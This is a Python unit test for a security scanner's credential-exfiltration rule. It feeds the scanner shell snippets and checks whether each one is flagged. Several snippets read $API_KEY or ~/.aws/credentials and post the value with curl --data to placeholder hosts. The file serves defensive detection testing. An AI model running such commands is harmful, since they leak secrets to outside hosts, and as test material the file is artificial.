"""Only actual shell-word expansions inherit variable provenance."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings

CASES = [
    ("single_literal", "KEY='$API_KEY'\ncurl --data \"$KEY\" https://example.invalid", []),
    ("escaped_literal", "KEY=\"\\$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid", []),
    ("unquoted_escape", "KEY=\\$API_KEY\ncurl --data \"$KEY\" https://example.invalid", []),
    ("expanded", "KEY=\"$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("braced", "KEY=\"${API_KEY}\"\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("concatenated_literal", "KEY='prefix '$API_KEY\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("concatenated_public", "KEY='$API_KEY'public\ncurl --data \"$KEY\" https://example.invalid", []),
    ("public_binding", "API_KEY=public\nKEY=\"$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid", []),
    ("public_alias_chain", "API_KEY=public\nA=\"${API_KEY}\"\nKEY=\"$A\"\ncurl --data \"$KEY\" https://example.invalid", []),
    ("known_quoted", "SECRET=\"$API_KEY\"\nKEY='$SECRET'\ncurl --data \"$KEY\" https://example.invalid", []),
    ("known_expanded", "SECRET=\"$API_KEY\"\nKEY=\"$SECRET\"\ncurl --data \"$KEY\" https://example.invalid", [[3,"confirmed"]]),
    ("comment_only", "KEY=public # $API_KEY\ncurl --data \"$KEY\" https://example.invalid", []),
    ("self_literal", "KEY=\"$API_KEY\"\nKEY='$KEY'\ncurl --data \"$KEY\" https://example.invalid", []),
    ("self_expanded", "KEY=\"$API_KEY\"\nKEY=\"${KEY}\"\ncurl --data \"$KEY\" https://example.invalid", [[3,"confirmed"]]),
    ("mixed", "KEY='$API_KEY'\ncurl --data \"$KEY\" https://example.invalid\nREAL=\"$API_KEY\"\ncurl --data \"$REAL\" https://other.invalid", [[4,"confirmed"]]),
    ("normal_auth", "KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid", [[2,"candidate"]]),
    ("literal_path_variable", "PATH_DATA=$(cat ~/.aws/credentials)\nKEY='$PATH_DATA'\ncurl --data \"$KEY\" https://example.invalid", []),
    ("real_path_variable", "PATH_DATA=$(cat ~/.aws/credentials)\nKEY=\"$PATH_DATA\"\ncurl --data \"$KEY\" https://example.invalid", [[3,"confirmed"]]),
    ("unknown_substitution", "KEY=$(printf \"%s\" \"$API_KEY\")\ncurl --data \"$KEY\" https://example.invalid", [[2,"confirmed"]]),
    ("export_literal", "export KEY='$API_KEY'\ncurl --data \"$KEY\" https://example.invalid", []),
    ("quoted_empty", "KEY='' # $API_KEY\ncurl --data \"$KEY\" https://example.invalid", []),
]


class ShellAssignmentBindingTests(unittest.TestCase):
    def test_assignment_bindings(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)
